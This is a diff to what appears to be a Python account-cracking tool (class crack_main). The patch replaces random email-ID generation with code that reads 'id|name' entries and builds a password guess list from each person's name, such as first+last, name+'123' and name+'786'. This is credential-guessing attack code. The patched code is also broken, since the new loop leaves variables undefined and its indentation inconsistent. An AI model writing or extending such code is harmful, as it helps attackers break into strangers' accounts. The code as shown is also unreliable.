@@ -401,9 +401,16 @@ class crack_main():
                 domain = input(" Domain : ")
                 print("\n [?] Limit ids Example 1000,5000,50000")
                 limit = int(input(" Limit Ids : "))
-                for nmbr in range(limit):
-                        nmpp = random.randint(99,9999)
-                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
+                for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                         naseeb = open('mail.txt','a').write(nmp)
                 self.id = open('mail.txt').read().splitlines()
                 self.pasw()
